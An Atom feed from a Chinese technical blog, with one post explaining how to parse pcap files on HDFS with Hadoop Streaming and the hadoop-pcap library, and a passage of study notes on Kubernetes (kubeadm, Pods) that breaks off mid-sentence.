<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>woodpile27</title>
  
  
  <link href="http://woodpile27.cn/atom.xml" rel="self"/>
  
  <link href="http://woodpile27.cn/"/>
  <updated>2021-04-25T09:15:37.169Z</updated>
  <id>http://woodpile27.cn/</id>
  
  <author>
    <name>John Doe</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>使用 Hadoop Streaming 解析 pcap 文件</title>
    <link href="http://woodpile27.cn/2021/04/25/use-hadoop-streaming-to-parse-pcap-files/"/>
    <id>http://woodpile27.cn/2021/04/25/use-hadoop-streaming-to-parse-pcap-files/</id>
    <published>2021-04-25T00:00:00.000Z</published>
    <updated>2021-04-25T09:15:37.169Z</updated>
    
    <content type="html"><![CDATA[<p>在最近的工作中遇到需要解析大量 pcap 文件的需求，部门里原来的做法是将储存在 HDFS 上的 pcap 文件下载到本地再进行处理，这样无疑会带来处理数量上的瓶颈，并且整个处理逻辑也比较复杂。通过为 Hadoop 编写解析 pcap 插件的方式使得可以直接使用 Hadoop 处理。</p><h3 id="hadoop-pcap"><a href="#hadoop-pcap" class="headerlink" title="hadoop-pcap"></a>hadoop-pcap</h3><p>github 上有一个 RIPE-NCC 的开源项目 <a href="https://github.com/RIPE-NCC/hadoop-pcap">hadoop-pcap</a>，项目中的 <a href="https://github.com/RIPE-NCC/hadoop-pcap/tree/master/hadoop-pcap-lib">hadoop-pcap-lib</a> 可以在 MapReduce 作业中使用来读取 pcap 文件。hadoop-pcap-lib 中还提供了各种协议的解析功能，如 dns、http 等，当然也可以根据自己的需求定制。在我们的需求中只需要将每个 pcap 文件中 packet 的 payload 按照顺序输出给同一个 mapper。下边我们来看一下项目中用到的关键类。</p><h4 id="PcapInputFormat"><a href="#PcapInputFormat" class="headerlink" title="PcapInputFormat"></a>PcapInputFormat</h4><p>hadoop steaming 中有一个 <code>-inputformat</code> 参数，来为 Hadoop 指定 InputFormatClass，这个类描述了 MR 的输入规范。<br>InputFormat 的作用：</p><ol><li>验证作业的输入格式</li><li>将输入文件拆分成 InputSplits，并将每个 InputSplit 分配给一个 mapper</li><li>提供 RecordReader 实现，用于从 InputSplit 读取输入（key-value）并提供给 mapper 处理</li></ol><p>用一句话来总结就是：InputFormat 定义如何将数据切割成分片和如何读取分片中的数据。这两个功能分别由 <code>getSplits()</code> 和 <code>RecordReader</code> 完成。</p><p>hadoop 中默认的 InputFormat 是 TextInputFormat，用于纯文本文件，也是我们一般所处理的文件，其输出的 value 是文件中的每一行， key 是每一行在文件中的位置。hadoop 中也提供了用于读取普通文件的 FileInputFormat、用于读取数据库的 DBInputFormat 等。<br>我们所要实现的 PcapInputFormat 继承自 FileInputFormat。FileInputFormat 是所有基于文件的 InputFormat 的基类，其提供了 getSplits 的通用实现，但一个 pcap 文件作为一个整体是不能拆分的，FileInputFormat 同样也提供了 <code>isSplitable</code> 方法防止文件被拆分，在 hadoop-pcap-lib 的 PcapInputFormat.java 中也可以看到重写了 <code>isSplitable</code> 方法让其 return false。这也正好符合我们让一个 mapper 处理一个 pcap 文件的需求。<br>PcapInputFormat.java 中还重写了 createRecordReader 方法，其返回一个自定义的 <code>RecordReader</code>：PcapRecordReader</p><h4 id="PcapRecordReader"><a href="#PcapRecordReader" class="headerlink" title="PcapRecordReader"></a>PcapRecordReader</h4><p>PcapRecordReader 其实并没有太关键的实现，也没有太复杂的逻辑。比较关键的几个方法是</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">PcapReader pcapReader;</span><br><span class="line">   Iterator&lt;Packet&gt; pcapReaderIterator;</span><br><span class="line"><span class="keyword">long</span> packetCount = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">   <span class="meta">@Override</span></span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">nextKeyValue</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">       <span class="keyword">if</span> (!pcapReaderIterator.hasNext())</span><br><span class="line">           <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line">       key.set(++packetCount);</span><br><span class="line">       value.set(pcapReaderIterator.next());</span><br><span class="line"></span><br><span class="line">       context.setStatus(<span class="string">&quot;Read &quot;</span> + getPos() + <span class="string">&quot; of &quot;</span> + end + <span class="string">&quot; bytes&quot;</span>);</span><br><span class="line">       context.progress();</span><br><span class="line"></span><br><span class="line">       <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="meta">@Override</span></span><br><span class="line">   <span class="function"><span class="keyword">public</span> ObjectWritable <span class="title">getCurrentValue</span><span class="params">()</span> </span>&#123;</span><br><span class="line">       <span class="keyword">return</span> value;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="meta">@Override</span></span><br><span class="line">   <span class="function"><span class="keyword">public</span> LongWritable <span class="title">getCurrentKey</span><span class="params">()</span> </span>&#123;</span><br><span class="line">       <span class="keyword">return</span> key;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><ul><li>nextKeyValue：读取下一个 key-value 键值对，可以看到 key 被设置成当前读取的 pcap 文件中 packetcount，value 被设置成 pcapReaderIterator.next()，pcapReaderIterator 是一个 packet 的迭代器，他来自 <code>PcapRecordReader</code> 的第一个参数 <code>PcapReader</code>类，其返回的其实是一个 <code>Packet</code>。</li><li>getCurrentValue：获取当前的 value</li><li>getCurrentKey：获取当前的 key</li></ul><p>mapper 在运行的过程中，首先会判断是否有下一个 key-value，如果有就传入当前的 key 和 value 到 map。</p><blockquote><p>另外需要注意的一点是不同版本的 Hadoop API 是有区别的，比如说在 <a href="https://hadoop.apache.org/docs/stable/api/org/apache/hadoop/mapred/RecordReader.html">RecordReader (Apache Hadoop Main 3.2.2 API)</a> 和 <a href="https://hadoop.apache.org/docs/current/api/org/apache/hadoop/mapreduce/RecordReader.html">RecordReader (Apache Hadoop Main 3.3.0 API)</a> 中，RecordReader 类的方法就有所不同。目前的 hadoop-pcap-lib 跟 3.3.0 版本是一致的，但在实际环境中需要跟 hadoop 的版本保持一致。</p></blockquote><h4 id="Packet"><a href="#Packet" class="headerlink" title="Packet"></a>Packet</h4><p>在 PcapReader 之前先来说一下 Packet，它是一个 HashMap，它的 key 是 pcap 文件格式中 packet 的一些字段和 TCP/IP 协议中数据包的一些字段。其字段的值是在 PcapReader 中解析并设置的。在上面的 PcapRecordReader 中我们可以看到其输出的 key 就是一个 Packet，map 最终得到的值就是 Packet 中 toString 方法的输出。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Packet</span> <span class="keyword">extends</span> <span class="title">HashMap</span>&lt;<span class="title">String</span>, <span class="title">Object</span>&gt; </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = <span class="number">8723206921174160146L</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> String TIMESTAMP = <span class="string">&quot;ts&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> String TIMESTAMP_USEC = <span class="string">&quot;ts_usec&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> String TIMESTAMP_MICROS = <span class="string">&quot;ts_micros&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> String TTL = <span class="string">&quot;ttl&quot;</span>;</span><br><span class="line">    ......</span><br><span class="line">    ......</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        StringBuffer sb = <span class="keyword">new</span> StringBuffer();</span><br><span class="line">        <span class="keyword">for</span> (Map.Entry&lt;String, Object&gt; entry : entrySet()) &#123;</span><br><span class="line">            sb.append(entry.getKey());</span><br><span class="line">            sb.append(<span class="string">&#x27;=&#x27;</span>);</span><br><span class="line">            sb.append(entry.getValue());</span><br><span class="line">            sb.append(<span class="string">&#x27;,&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (sb.length() &gt; <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">return</span> sb.substring(<span class="number">0</span>, sb.length() - <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果需要自定义参数或者自定义输出，就改动 Packet 类的实现，比如在我们的需求中，就加入了 payload 字段。</p><h4 id="PcapReader"><a href="#PcapReader" class="headerlink" title="PcapReader"></a>PcapReader</h4><p>PcapReader 是 PcapInputFormat 中的 initPcapReader 方法创建的，其只有一个参数 is，类型是 DataInputStream，其实就是当前 PcapRecordReader 所处理的 pcap 文件流。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> PcapRecordReader <span class="title">initPcapRecordReader</span><span class="params">(Path path, <span class="keyword">long</span> start, <span class="keyword">long</span> length, Reporter reporter, Configuration conf)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    FileSystem fs = path.getFileSystem(conf);</span><br><span class="line">    FSDataInputStream baseStream = fs.open(path);</span><br><span class="line">    DataInputStream stream = baseStream;</span><br><span class="line">    CompressionCodecFactory compressionCodecs = <span class="keyword">new</span> CompressionCodecFactory(conf);</span><br><span class="line">       <span class="keyword">final</span> CompressionCodec codec = compressionCodecs.getCodec(path);</span><br><span class="line">       <span class="keyword">if</span> (codec != <span class="keyword">null</span>)</span><br><span class="line">           stream = <span class="keyword">new</span> DataInputStream(codec.createInputStream(stream));</span><br><span class="line"></span><br><span class="line">    PcapReader reader = initPcapReader(stream, conf);</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> PcapRecordReader(reader, start, length, baseStream, stream, reporter);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>PcapReader 首先会使用 readBytes 方法读取 pcap 头，关于 pcap 文件格式这里就不过多介绍了。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">public PcapReader(DataInputStream is) throws IOException &#123;</span><br><span class="line">    this.is &#x3D; is;</span><br><span class="line">    iterator &#x3D; new PacketIterator();</span><br><span class="line"></span><br><span class="line">    pcapHeader &#x3D; new byte[HEADER_SIZE];</span><br><span class="line">    if (!readBytes(pcapHeader)) &#123;</span><br><span class="line">        &#x2F;&#x2F;</span><br><span class="line">        &#x2F;&#x2F; This special check for EOF is because we don&#39;t want</span><br><span class="line">        &#x2F;&#x2F; PcapReader to barf on an empty file.  This is the only</span><br><span class="line">        &#x2F;&#x2F; place we check caughtEOF.</span><br><span class="line">        &#x2F;&#x2F;</span><br><span class="line">        if (caughtEOF) &#123;</span><br><span class="line">            LOG.warn(&quot;Skipping empty file&quot;);</span><br><span class="line">            return;</span><br><span class="line">        &#125;</span><br><span class="line">        throw new IOException(&quot;Couldn&#39;t read PCAP header&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if (!validateMagicNumber(pcapHeader))</span><br><span class="line">        throw new IOException(&quot;Not a PCAP file (Couldn&#39;t find magic number)&quot;);</span><br><span class="line"></span><br><span class="line">    snapLen &#x3D; PcapReaderUtil.convertInt(pcapHeader, PCAP_HEADER_SNAPLEN_OFFSET, reverseHeaderByteOrder);</span><br><span class="line"></span><br><span class="line">    long linkTypeVal &#x3D; PcapReaderUtil.convertInt(pcapHeader, PCAP_HEADER_LINKTYPE_OFFSET, reverseHeaderByteOrder);</span><br><span class="line">    if ((linkType &#x3D; getLinkType(linkTypeVal)) &#x3D;&#x3D; null)</span><br><span class="line">        throw new IOException(&quot;Unsupported link type: &quot; + linkTypeVal);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这部分就是 PcapRecordReader 直接调用的部分，PcapReader 本身是一个 Iterable 接口，它的 iterator 方法返回一个 Iterator 对象，可以使用for each 循环进行遍历，而 fetchNext 方法调用的是 PcapReader 的 nextPacket 方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="class"><span class="keyword">class</span> <span class="title">PacketIterator</span> <span class="keyword">implements</span> <span class="title">Iterator</span>&lt;<span class="title">Packet</span>&gt; </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> Packet next;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">fetchNext</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (next == <span class="keyword">null</span>)</span><br><span class="line">            next = nextPacket();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">hasNext</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        fetchNext();</span><br><span class="line">        <span class="keyword">if</span> (next != <span class="keyword">null</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        <span class="keyword">int</span> remainingFlows = flows.size();</span><br><span class="line">        <span class="keyword">if</span> (remainingFlows &gt; <span class="number">0</span>)</span><br><span class="line">            LOG.warn(<span class="string">&quot;Still &quot;</span> + remainingFlows + <span class="string">&quot; flows queued. Missing packets to finish assembly?&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Packet <span class="title">next</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        fetchNext();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> next;</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            next = <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">remove</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="comment">// Not supported</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>nextPacket 方法首先尝试读取一个 pcapPacketHeader ，即 pcap 中的 Packet Header 部分，接着创建一个 createPacket 对象，然后向其中写入 Packet Header 的一些字段，之后根据 Packet Header 中的 CAP_LEN 读取 Packet Data 部分，接着读取数据包的一些参数。<br>如果需要自定义输出，在这里也需要做出修改，在我们的需求中，写入 Packet 的 Payload 就可以直接返回了。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> Packet <span class="title">nextPacket</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    pcapPacketHeader = <span class="keyword">new</span> <span class="keyword">byte</span>[PACKET_HEADER_SIZE];</span><br><span class="line">    <span class="keyword">if</span> (!readBytes(pcapPacketHeader))</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">    Packet packet = createPacket();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">long</span> packetTimestamp = PcapReaderUtil.convertInt(pcapPacketHeader, TIMESTAMP_OFFSET, reverseHeaderByteOrder);</span><br><span class="line">    packet.put(Packet.TIMESTAMP, packetTimestamp);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">long</span> packetTimestampMicros = PcapReaderUtil.convertInt(pcapPacketHeader, TIMESTAMP_MICROS_OFFSET, reverseHeaderByteOrder);</span><br><span class="line">    packet.put(Packet.TIMESTAMP_MICROS, packetTimestampMicros);</span><br><span class="line"></span><br><span class="line">       BigDecimal packetTimestampUsec = <span class="keyword">new</span> BigDecimal(packetTimestamp + packetTimestampMicros / <span class="number">1000000.0</span>, tsUsecMc);</span><br><span class="line">       packet.put(Packet.TIMESTAMP_USEC, packetTimestampUsec.doubleValue());</span><br><span class="line"></span><br><span class="line">    <span class="keyword">long</span> packetSize = PcapReaderUtil.convertInt(pcapPacketHeader, CAP_LEN_OFFSET, reverseHeaderByteOrder);</span><br><span class="line">    packetData = <span class="keyword">new</span> <span class="keyword">byte</span>[(<span class="keyword">int</span>)packetSize];</span><br><span class="line">    <span class="keyword">if</span> (!readBytes(packetData))</span><br><span class="line">        <span class="keyword">return</span> packet;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> ipStart = findIPStart(packetData);</span><br><span class="line">    ......</span><br><span class="line">    ......</span><br></pre></td></tr></table></figure><h3 id="使用-hadoop-pcap"><a href="#使用-hadoop-pcap" class="headerlink" title="使用 hadoop-pcap"></a>使用 hadoop-pcap</h3><p>在了解了 hadoop-pcap 的基本原理后，我们可以定制自己的 pcap 解析程序，当然也可以使用其提供的一些功能。下面介绍一下如何使用已经定制好的 hadoop-pcap。</p><h4 id="编译-amp-打包"><a href="#编译-amp-打包" class="headerlink" title="编译&amp;打包"></a>编译&amp;打包</h4><p>为了简便，我把改写过的几个 java 文件放在了同一个文件夹里，项目结构如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">.</span><br><span class="line">├── lib</span><br><span class="line">│   ├── apache-httpcomponents-httpclient.jar</span><br><span class="line">│   ├── commons-codec-1.9.jar</span><br><span class="line">│   ├── commons-lang3-3.3.2.jar</span><br><span class="line">│   ├── commons-logging-1.1.1.jar</span><br><span class="line">│   ├── commons-net-3.0.1.jar</span><br><span class="line">│   ├── dnsjava-2.1.1.jar</span><br><span class="line">│   ├── guava-11.0.jar</span><br><span class="line">│   ├── hadoop-0.20.2.1U11-core.jar</span><br><span class="line">│   ├── hadoop-0.20.2-cdh3u4-core.jar</span><br><span class="line">│   └── httpcore-4.2.1.jar</span><br><span class="line">├── src</span><br><span class="line">│   └── com</span><br><span class="line">│       └── netlab</span><br><span class="line">│           └── botnet</span><br><span class="line">│               ├── CombinePcapInputFormat.java</span><br><span class="line">│               ├── CombinePcapRecordReader.java</span><br><span class="line">│               ├── Flow.java</span><br><span class="line">│               ├── Packet.java</span><br><span class="line">│               ├── PcapInputFormat.java</span><br><span class="line">│               ├── PcapReader.java</span><br><span class="line">│               ├── PcapReaderUtil.java</span><br><span class="line">│               └── PcapRecordReader.java</span><br><span class="line">└── target</span><br></pre></td></tr></table></figure><p>使用 javac 编译。因为公司的 hadoop 版本不是最新的，使用的是 1.7 的 jdk，需要在编译时使用 -source 和 -target 参数指定版本。-cp 参数指定 lib 目录里程序所依赖的 jar 包。-d 指定输出目录，编译的结果会存放到 target 目录里。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javac -<span class="built_in">source</span> 1.7 -target 1.7 -cp <span class="string">&quot;./lib/*&quot;</span> -d target ./src/com/netlab/botnet/*.java</span><br></pre></td></tr></table></figure><p>在 target 目录里新建 META-INF/MENIFEST.MF 并写入 <code>Main-Class: PcapInputFormat</code>，之后执行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jar -cvfm pcapinputformat.jar META-INF/MENIFEST.MF com/netlab/botnet/*.class</span><br></pre></td></tr></table></figure><h4 id="运行-Hadoop-Straming"><a href="#运行-Hadoop-Straming" class="headerlink" title="运行 Hadoop Straming"></a>运行 Hadoop Straming</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">streaming_path=/usr/bin/hadoop/software/hadoop/contrib/streaming/hadoop-streaming.jar</span><br><span class="line">HADOOP=/usr/bin/hadoop/software/hadoop/bin/hadoop</span><br><span class="line"></span><br><span class="line"><span class="variable">$HADOOP</span> jar <span class="variable">$streaming_path</span> \</span><br><span class="line">        -libjars <span class="string">&quot;/home/hdp-netlab/chailinyuan/fdark-test/pcapinputformat.jar&quot;</span> \</span><br><span class="line">        -inputformat <span class="string">&quot;com.netlab.botnet.PcapInputFormat&quot;</span> \</span><br><span class="line">        ......</span><br></pre></td></tr></table></figure><p>-libjars 参数是打包好的 jar 的位置，-inputformat 参数是 PcapInputFormat 的 package 名。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;在最近的工作中遇到需要解析大量 pcap 文件的需求，部门里原来的做法是将储存在 HDFS 上的 pcap 文件下载到本地再进行处理，这样无疑会带来处理数量上的瓶颈，并且整个处理逻辑也比较复杂。通过为 Hadoop 编写解析 pcap 插件的方式使得可以直接使用 Hadoo</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>深入剖析 Kubernetes 笔记（二）</title>
    <link href="http://woodpile27.cn/2020/12/28/kubernetes-note-2/"/>
    <id>http://woodpile27.cn/2020/12/28/kubernetes-note-2/</id>
    <published>2020-12-28T00:00:00.000Z</published>
    <updated>2020-12-28T10:39:56.120Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://time.geekbang.org/column/intro/116">深入剖析Kubernetes（极客时间）</a></p><h3 id="10-Kubernetes-一键部署利器：kubeadm"><a href="#10-Kubernetes-一键部署利器：kubeadm" class="headerlink" title="10. Kubernetes 一键部署利器：kubeadm"></a>10. Kubernetes 一键部署利器：kubeadm</h3><blockquote><p>kubeadm 的工作原理</p><ul><li>kubelet 是 Kubernetes 项目用来操作 Docker 等容器运行时的核心组件。需要操作宿主机，难以容器化。</li><li>kubeadm 选择把 kubelet 直接运行在宿主机上，然后使用容器部署其他的 Kubernetes 组件。</li><li>所以使用 kubeadm 的第一步，是手动安装 kubeadm、kubelet 和 kubectl 这三个二进制文件。</li></ul><p>kubeadm init 的工作流程</p><ol><li>Preflight Checks，一系列的检查工作，以确定这台机器可以用来部署 Kubernetes。</li><li>生成 Kubernetes 对外提供服务所需的各种证书和对应的目录。/etc/kubernetes/pki/</li><li>为其他组件生成访问 kube-apiserver 所需的配置文件。/etc/kubernetes/xxx.conf</li><li>为 Master 组件生成 Pod 配置文件，包括 apiserver、manager、scheduler。/etc/kubernetes/manifests/</li><li>当配置文件出现在被 kubelet 监视的 /etc/kubernetes/manifests 目录下，kubelet 会自动创建对应的 pod。</li><li>kubeadm 为集群生成一个 bootstrap token。持有 token 的工作节点都可以加入集群。在 token 生成之后，kubeadm 会将 ca.crt 等 Master 节点的重要信息，通过 ConfigMap 的方式保存在 Etcd 当中，供后续部署 Node 节点使用。</li></ol><p>kubeadm join 的工作流程<br>为什么需要 token ？</p><blockquote><p>任何一台机器想要成为 Kubernetes 集群中的一个节点，就必须在集群的 kube-apiserver 上注册。可是，要想跟 apiserver 打交道，这台机器就必须要获取到相应的证书文件（CA 文件）。可是，为了能够一键安装，我们就不能让用户去 Master 节点上手动拷贝这些文件。<br>所以，kubeadm 至少需要发起一次“不安全模式”的访问到 kube-apiserver，从而拿到保存在 ConfigMap 中的 cluster-info（它保存了 APIServer 的授权信息）。而 bootstrap token，扮演的就是这个过程中的安全验证的角色。</p></blockquote><p>配置 kubeadm 的部署参数<br>强烈推荐使用 <code>kubeadm init --config kubeadm.yaml</code></p></blockquote><h3 id="12-牛刀小试：我的第一个容器化应用"><a href="#12-牛刀小试：我的第一个容器化应用" class="headerlink" title="12. 牛刀小试：我的第一个容器化应用"></a>12. 牛刀小试：我的第一个容器化应用</h3><blockquote><p>Pod 就是 Kubernetes 世界里的“应用”；而一个应用，可以由多个容器组成。<br>Metadata：存放元数据<br>Spec：存放这个对象独有的定义，用来描述它所要表达的功能。</p></blockquote><h3 id="13-为什么我们需要-Pod-？"><a href="#13-为什么我们需要-Pod-？" class="headerlink" title="13. 为什么我们需要 Pod ？"></a>13. 为什么我们需要 Pod ？</h3><blockquote><p>Pod，是 Kubernetes 项目中最小的 API 对象。同样是其<strong>原子调度单位</strong>。</p><p>Kubernetes 项目所做的，其实就是将“进程组”的概念映射到了容器技术中，并使其成为了这个云计算“操作系统”里的“一等公民”。</p><p>Kubernetes 项目的调度器，是统一按照 Pod 而非容器的资源需求进行计算的。</p><p>像这样容器间的紧密协作，我们可以称为“超亲密关系”。这些具有“超亲密关系”容器的典型特征包括但不限于：互相之间会发生直接的文件交换、使用 localhost 或者 Socket 文件进行本地通信、会发生非常频繁的远程调用、需要共享某些 Linux Namespace（比如，一个容器要加入另一个容器的 Network Namespace）等等。</p><p>Pod 只是一个逻辑概念，Kubernetes 真正处理的，还是宿主机操作系统上 Linux 容器的 Namespace 和 Cgroups，而并不存在一个所谓的 Pod 的边界或者隔离环境。</p><p>Pod，其实是一组共享了某些资源的容器。共享的是同一个 Network Namespace，并且可以声明共享同一个 Volume。</p><p>在 Kubernetes 项目里，Pod 的实现需要使用一个中间容器，这个容器叫作 Infra 容器。在这个 Pod 中，Infra 容器永远都是第一个被创建的容器，而其他用户定义的容器，则通过 Join Network Namespace 的方式，与 Infra 容器关联在一起。</p><p>如果一个 pod 里定义了两个容器 A 和 B，对于 A 和 B：</p><ul><li>它们可以直接使用 localhost 进行通信</li><li>它们看到的网络设备跟 Infra 容器看到的完全一样</li><li>一个 Pod 只有一个 IP 地址，也就是这个 Pod 的 Network Namespace 对应的 IP 地址</li><li>当然，其他的所有网络资源，都是一个 Pod 一份，并且被该 Pod 中的所有容器共享</li><li>Pod 的生命周期只跟 Infra 